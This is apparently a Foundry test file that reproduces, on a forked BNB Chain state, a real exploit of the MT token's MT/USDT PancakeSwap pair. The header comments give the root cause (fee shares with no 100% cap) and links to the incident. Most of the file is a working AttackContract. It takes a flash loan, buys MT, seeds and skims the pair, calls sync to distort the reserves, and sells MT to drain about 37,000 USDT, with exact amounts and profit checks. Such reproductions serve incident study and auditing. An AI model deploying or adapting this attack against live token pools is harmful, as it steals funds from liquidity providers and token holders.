// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "forge-std/console.sol";

// @KeyInfo - Net Pool Loss : ~36,995.244786737651151991 USDT / Gross USDT outflow from pool: ~226,722.244786737651151991 USDT
// Attacker profit: ~36,995.244786737651151991 USDT
// Attacker EOA : 0xe918a1784ceca08e51a1b740f4036fd149339811
// Flashloan Receiver (deployed in tx) : 0xb64f5d49656fae38655ef2e3c2e3768ddb5f3d5c
// Victim Token : 0x2f3f25046ea518d1e524b8fb6147c656d6722ced (MT)
// Victim Pair : 0xbf4707b7f9f53e3aae29bf2558cb373419ef4d45 (MT/USDT PancakeV2 pair)
// Attack Tx (BSC) : https://skylens.certik.com/tx/arb/0xe1e6aa5332deaf0fa0a3584113c17bedc906148730cbbc73efae16306121687b
//
// Root cause: MT token's `transactionFee()` splits `transactFeeValue` by an unbounded list of percentages without enforcing
// `sum(shares) <= 100`, allowing a transfer to debit the sender for far more than `amount`. AMM pairs are contracts and
// become unintended fee targets; after draining MT balance the attacker calls `sync()` and swaps a small amount of MT to
// drain USDT.
// 
// Post-mortem : https://x.com/nn0b0dyyy/status/2010638145155661942?s=20
// Twitter Alert : https://x.com/TenArmorAlert/status/2010630024274010460?s=20

contract MTExploitTest is Test {
    string internal constant BSC_RPC = "http://localhost:8124/bsc";

    uint256 internal constant ATTACK_BLOCK = 74_937_080;
    uint256 internal constant FORK_BLOCK = ATTACK_BLOCK - 1;
    uint256 internal constant ATTACK_TIMESTAMP = 1_768_205_155;

    IERC20 internal constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 internal constant MT = IERC20(0x2f3f25046Ea518d1E524B8fB6147c656D6722CeD);

    IPancakeV2Router internal constant ROUTER = IPancakeV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IPancakeV2Pair internal constant PAIR = IPancakeV2Pair(0xbf4707B7f9F53e3aAE29Bf2558CB373419Ef4D45);

    IMoolahFlashLoan internal constant FLASHLOAN = IMoolahFlashLoan(0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C);

	function setUp() public {
        vm.createSelectFork(BSC_RPC, FORK_BLOCK);
        vm.roll(ATTACK_BLOCK);
        vm.warp(ATTACK_TIMESTAMP);

        vm.label(address(USDT), "USDT");
        vm.label(address(MT), "MT");
        vm.label(address(ROUTER), "PancakeV2Router");
        vm.label(address(PAIR), "MT_USDT_Pair");
        vm.label(address(FLASHLOAN), "FlashLoanProvider");
    
	}

	function testMTExploit() public {
        address attackerEOA = address(0x00000000000000000000000000000000BEeFbEef);
        vm.label(attackerEOA, "AttackerEOA(sim)");
        vm.deal(attackerEOA, 1 ether);

        uint256 pairUsdtBefore = USDT.balanceOf(address(PAIR));
        uint256 attackerUsdtBefore = USDT.balanceOf(attackerEOA);

        console.log("=== PoC: MT fee-overcharge + sync drain (BSC) ===");
        console.log("fork block", FORK_BLOCK);
        console.log("attack block", ATTACK_BLOCK);
        console.log("attack timestamp", ATTACK_TIMESTAMP);
        console.log("pre: pair USDT", pairUsdtBefore);
        console.log("pre: attacker USDT", attackerUsdtBefore);

        vm.startPrank(attackerEOA);
        AttackContract attacker = new AttackContract(attackerEOA);
        attacker.start();
        vm.stopPrank();

        uint256 pairUsdtAfter = USDT.balanceOf(address(PAIR));
        uint256 attackerUsdtAfter = USDT.balanceOf(attackerEOA);

        console.log("post: pair USDT", pairUsdtAfter);
        console.log("post: attacker USDT", attackerUsdtAfter);
        console.log("delta: pair USDT", int256(pairUsdtAfter) - int256(pairUsdtBefore));
        console.log("delta: attacker USDT", attackerUsdtAfter - attackerUsdtBefore);

        require(attackerUsdtAfter > attackerUsdtBefore, "no attacker profit");
        require(attackerUsdtAfter - attackerUsdtBefore == 36_995_244_786_737_651_151_991, "unexpected profit");

        require(pairUsdtAfter == 13_995_530_540_603_531_151, "unexpected pair USDT final");
        require(pairUsdtBefore - pairUsdtAfter == 36_995_244_786_737_651_151_991, "unexpected pool net loss");
    
	}

}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);

}

interface IPancakeV2Router {
	function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    
			) external;

}

interface IPancakeV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

}

interface IMoolahFlashLoan {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;

}

contract AttackContract {
    IERC20 private constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 private constant MT = IERC20(0x2f3f25046Ea518d1E524B8fB6147c656D6722CeD);

    IPancakeV2Router private constant ROUTER = IPancakeV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IPancakeV2Pair private constant PAIR = IPancakeV2Pair(0xbf4707B7f9F53e3aAE29Bf2558CB373419Ef4D45);

    IMoolahFlashLoan private constant FLASHLOAN = IMoolahFlashLoan(0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C);

    address public immutable owner;

    uint256 private constant BUY_USDT_IN = 189_727e18;
    uint256 private constant BUY_MT_OUT = 6_881_053_957_270_342_278_899;

    uint256 private constant MT_SEED_TO_PAIR = 2_075_238_495_049_785_766_652;
    uint256 private constant SELL_MT_IN = 594_572_298_978_549_731_565;

	constructor(address owner_) {
        owner = owner_;

        USDT.approve(address(FLASHLOAN), type(uint256).max);
        USDT.approve(address(ROUTER), type(uint256).max);
        MT.approve(address(ROUTER), type(uint256).max);
    
	}

	function start() external {
        require(msg.sender == owner, "only owner");
        uint256 maxLoan = USDT.balanceOf(address(FLASHLOAN));
        console.log("AttackContract.start()");
        console.log("  flashloan amount (USDT)", maxLoan);
        FLASHLOAN.flashLoan(address(USDT), maxLoan, "");

        uint256 profit = USDT.balanceOf(address(this));
        console.log("  profit (USDT)", profit);
        require(USDT.transfer(owner, profit), "profit transfer failed");
    
	}

    // Callback used by the flashloan provider (selector 0x13a1a562, observed in trace).
	function onMoolahFlashLoan(uint256 amount, bytes calldata) external {
        require(msg.sender == address(FLASHLOAN), "not flashloan provider");

        console.log("onMoolahFlashLoan()");
        console.log("  amount (USDT)", amount);
        console.log("  USDT begin", USDT.balanceOf(address(this)));
        console.log("  MT begin", MT.balanceOf(address(this)));

        console.log("Step 1: buy MT (direct pair swap)");
        require(USDT.transfer(address(PAIR), BUY_USDT_IN), "USDT->pair transfer failed");
        PAIR.swap(BUY_MT_OUT, 0, address(this), "");

        console.log("  MT after buy", MT.balanceOf(address(this)));

        console.log("Step 2: seed MT to pair (creates skim-able excess)");
        require(MT.transfer(address(PAIR), MT_SEED_TO_PAIR), "MT->pair transfer failed");

        console.log("Step 3: pair.skim(attacker) (drains MT; transfer triggers buggy fee logic again)");
        PAIR.skim(address(this));

        console.log("Step 4: pair.sync() (locks manipulated reserves)");
        PAIR.sync();
        (uint112 r0, uint112 r1,) = PAIR.getReserves();
        console.log("  reserves token0(MT)", uint256(r0));
        console.log("  reserves token1(USDT)", uint256(r1));

        console.log("Step 5: sell MT -> USDT via router (fee-on-transfer supporting)");
        address[] memory path = new address[](2);
        path[0] = address(MT);
        path[1] = address(USDT);
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(SELL_MT_IN, 0, path, address(this), block.timestamp);

        console.log("  USDT after sell", USDT.balanceOf(address(this)));
        console.log("  MT after sell", MT.balanceOf(address(this)));
        // Repayment is pulled by the flashloan provider via `transferFrom(...)` after this callback returns.
    
	}

}

